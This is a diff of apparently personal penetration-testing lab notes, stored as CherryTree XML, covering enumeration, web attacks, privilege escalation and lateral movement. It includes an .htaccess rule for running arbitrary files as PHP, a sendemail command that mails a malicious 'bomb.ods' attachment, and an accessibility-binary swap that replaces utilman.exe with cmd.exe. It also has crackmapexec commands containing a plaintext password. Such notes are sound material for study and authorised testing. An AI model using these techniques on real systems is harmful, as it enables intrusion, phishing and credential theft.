@@ -121,7 +121,7 @@ More exploits: </rich_text>
 dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
           <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
         </node>
-        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1692773330">
+        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1693325105">
           <rich_text>We have to </rich_text>
           <rich_text weight="heavy">Dirbust</rich_text>
           <rich_text> and </rich_text>
@@ -165,6 +165,11 @@ SPECIAL CASE:
           <rich_text style="italic">/manager/html</rich_text>
           <rich_text> in order to upload a </rich_text>
           <rich_text weight="heavy">malicious war</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text weight="heavy">!Note:</rich_text>
+          <rich_text> We can use burp bind port to use our localhost as the webserver and burp will redirect anything on the target (good for debugging), so no proxy will be involved.</rich_text>
           <node name="SQL injections" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496816" ts_lastsave="1691996989">
             <rich_text>- check with quote “ ' ”
 - check the request in network tab for errors
@@ -199,7 +204,9 @@ More on SQL injections:
 - try requesting localhost =&gt; if we get a specific agent, maybe we will find an exploit for it
 
 For internal port scanning using SSRF, we can use WFUZZ.
-
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
 
 More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
@@ -235,7 +242,7 @@ Check </rich_text>
 More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</rich_text>
           </node>
-          <node name="Upload Feature" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830881" ts_lastsave="1688832905">
+          <node name="Upload Feature" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830881" ts_lastsave="1693325065">
             <rich_text>- We can try to get the </rich_text>
             <rich_text weight="heavy">Kerberos Ticket</rich_text>
             <rich_text> with </rich_text>
@@ -247,6 +254,15 @@ More on that here: </rich_text>
             <rich_text>
 - We can try uplading reverse shells
 
+</rich_text>
+            <rich_text weight="heavy">!Important:</rich_text>
+            <rich_text> If we are able to upload </rich_text>
+            <rich_text weight="heavy">.htaccess</rich_text>
+            <rich_text>, we can make any file extension executable.
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
 Bypass methods for upload protection: 
 - </rich_text>
             <rich_text link="webs https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass</rich_text>
@@ -257,6 +273,7 @@ Bypass methods for upload protection:
 
 More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
+            <codebox char_offset="300" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">AddType application/x-httpd-php .anything</codebox>
           </node>
           <node name="STUCK?" unique_id="118" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1691569520" ts_lastsave="1691569562">
             <rich_text>- Dirbust one more time, each directory found in particular
@@ -264,7 +281,7 @@ More on that here: </rich_text>
 - Try using POST params as GET</rich_text>
           </node>
         </node>
-        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1690710202">
+        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1693208687">
           <rich_text>We can use </rich_text>
           <rich_text weight="heavy">Evolution</rich_text>
           <rich_text> as a </rich_text>
@@ -318,6 +335,13 @@ Example:
           <rich_text style="italic">-ap</rich_text>
           <rich_text> is for providing auth passwords
 
+Or by using </rich_text>
+          <rich_text weight="heavy">sendemail</rich_text>
+          <rich_text>:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
 Check this methodology: </rich_text>
           <rich_text link="webs https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp">https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp</rich_text>
           <codebox char_offset="258" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -365,6 +389,12 @@ Sub MyMacro()
 End Sub</codebox>
           <codebox char_offset="693" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
 --header "Subject: Example" --suppress-data -ap</codebox>
+          <codebox char_offset="865" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sendemail -f 'jonas@localhost' \
+                       -t 'mailadmin@localhost' \
+                       -s 192.168.120.132:25 \
+                       -u 'Your spreadsheet' \
+                       -m 'Here is your requested spreadsheet' \
+                       -a bomb.ods</codebox>
         </node>
         <node name="MSSQL" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500078" ts_lastsave="1689507889">
           <rich_text>Port - 1433
@@ -424,16 +454,21 @@ More on it here: </rich_text>
       </node>
       <node name="UDP" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559301" ts_lastsave="1579569609">
         <rich_text>[ NMAP OVERVIEW ]</rich_text>
-        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1690710008">
+        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1693404666">
           <rich_text>Before searching, it might be useful to update our MIB:
 </rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>s
 
-AutoRecon.py will enumerate the service.
+</rich_text>
+          <rich_text weight="heavy">AutoRecon.py</rich_text>
+          <rich_text> will enumerate the service.
 Check out:
 - onesixtyone
 - snmpwalk
+- snmp-check (</rich_text>
+          <rich_text weight="heavy">always use this tool also</rich_text>
+          <rich_text>)
 
 Enumerate the last command executed:
 </rich_text>
@@ -446,7 +481,7 @@ Also check this out: </rich_text>
           <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</rich_text>
           <codebox char_offset="56" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo download-mibs
 # This will use /etc/snmp-mibs-downloader to download files from those config files.</codebox>
-          <codebox char_offset="175" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
+          <codebox char_offset="216" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
         </node>
       </node>
       <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1692951137">
@@ -533,7 +568,7 @@ Also check this out: </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.
 </rich_text>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1690927663">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1693404538">
         <rich_text>Use:
 - linpeas
 - kernel exploit suggester
@@ -592,6 +627,10 @@ Check capabilities:
 Check opened ports:
 </rich_text>
         <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Check running commands:
+</rich_text>
         <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
         <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
@@ -599,6 +638,7 @@ Check opened ports:
 # And search for everyone</codebox>
         <codebox char_offset="743" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -tulpn
 # Maybe we can interact with an internal opened port?</codebox>
+        <codebox char_offset="770" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ps -eo</codebox>
         <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1692172613">
           <rich_text>---------------------- Services and Reboot Privs ----------------------
 If we have these SUDO capabilities (sudo -l):
@@ -655,11 +695,12 @@ chmod +x /tmp/{binary}
 # Also check for .dockerenv file in root directory /.dockerenv =&gt; we are in a container</codebox>
         </node>
       </node>
-      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1693136040">
+      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1693404563">
         <rich_text>Use (and read CAREFULLY the output):
 - winpeas
 - PowerUp
 - SharpUp
+- Sherlock.psq (for kernel exploits)
 
 Pay attention on privilegeges of the user:
 </rich_text>
@@ -735,27 +776,29 @@ Note, for cross compiling, mingw-w64 calls:
 Regarding services, after replacing binary, restart the system with:
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="111" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /all
+        <codebox char_offset="148" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /all
 whoami /priv</codebox>
-        <codebox char_offset="172" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /group</codebox>
-        <codebox char_offset="204" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-ChildItem -Filter *.txt -Recurse -ErrorAction SilentlyContinue
+        <codebox char_offset="209" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /group</codebox>
+        <codebox char_offset="241" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-ChildItem -Filter *.txt -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Fullname</codebox>
-        <codebox char_offset="672" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
-        <codebox char_offset="691" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
-        <codebox char_offset="716" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -ano
+        <codebox char_offset="709" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
+        <codebox char_offset="728" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
+        <codebox char_offset="753" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -ano
 # Maybe we can interact with an internal opened port</codebox>
-        <codebox char_offset="887" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">i686-w64-mingw32-gcc   - Win x32
+        <codebox char_offset="924" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">i686-w64-mingw32-gcc   - Win x32
 x86_64-w64-mingw32-gcc - Win x64</codebox>
-        <codebox char_offset="1145" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">shutdown /r</codebox>
+        <codebox char_offset="1182" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">shutdown /r</codebox>
         <node name="Important" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693136040" ts_lastsave="1693136108">
           <rich_text>When we cannot read the winpeas output on kali machine, we have to use:
 </rich_text>
+          <rich_text justification="left"></rich_text>
           <codebox char_offset="72" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dos2unix -f outputwinpeas.txt # will convert to readable file on *NIX systems
 # Then
 less -r outputwinpeas.txt</codebox>
         </node>
+        <node name="Special Cases" unique_id="121" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693404563" ts_lastsave="1693404748"/>
       </node>
-      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1692172545">
+      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1693324956">
         <rich_text>- Recheck every line of output from Winpeas/Linpeas
 - Recheck files
 - Rerun Winpeas/Linpeas
@@ -782,6 +825,9 @@ less -r outputwinpeas.txt</codebox>
         <rich_text weight="heavy">job that may be a service or a scheduled job </rich_text>
         <rich_text>and replace with a reverse shell - </rich_text>
         <rich_text weight="heavy">Only Windows</rich_text>
+        <rich_text>
+- If no hotfixes are available, check</rich_text>
+        <rich_text weight="heavy"> C:\Windows\SoftwareDistribution\Download</rich_text>
         <rich_text>
 
 - Always check </rich_text>
@@ -895,7 +941,7 @@ lsadump::sam</codebox>
           <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
         </node>
       </node>
-      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693137133">
+      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693324904">
         <rich_text>Try credentials using crackmapexec:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -934,7 +980,11 @@ We can use </rich_text>
 Try moving lateraly with:
 - RDP
 - WinRM
-- PSExec</rich_text>
+- PSExec (we can do it from kali with </rich_text>
+        <rich_text weight="heavy">psexec.py</rich_text>
+        <rich_text>)
+- RunAS: </rich_text>
+        <rich_text link="webs https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs</rich_text>
         <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
 proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
 </codebox>
@@ -971,7 +1021,7 @@ echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual trans
         <rich_text>)
 - Check for password reusal</rich_text>
       </node>
-      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142435">
+      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693404762">
         <rich_text>If we find that we have </rich_text>
         <rich_text weight="heavy">PrincipalsAllowedToRetrieveManagedPassword</rich_text>
         <rich_text> (we have an allowed group) permissions to extract passwords, use: </rich_text>
@@ -998,6 +1048,13 @@ If we have </rich_text>
 
 Or try this: </rich_text>
         <rich_text link="webs https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</rich_text>
+        <rich_text>.
+
+
+</rich_text>
+        <rich_text weight="heavy">SeBackupPrivilege</rich_text>
+        <rich_text> - use this tutorial </rich_text>
+        <rich_text link="webs https://juggernaut-sec.com/sebackupprivilege/#Exfiltrating_the_SAM_and_SYSTEM_Files_Dumping_the_Hashes_and_Performing_a_Pass-the-Hash_Attack_to_Escalate_to_SYSTEM">https://juggernaut-sec.com/sebackupprivilege/#Exfiltrating_the_SAM_and_SYSTEM_Files_Dumping_the_Hashes_and_Performing_a_Pass-the-Hash_Attack_to_Escalate_to_SYSTEM</rich_text>
         <codebox char_offset="366" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
 move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</codebox>
       </node>
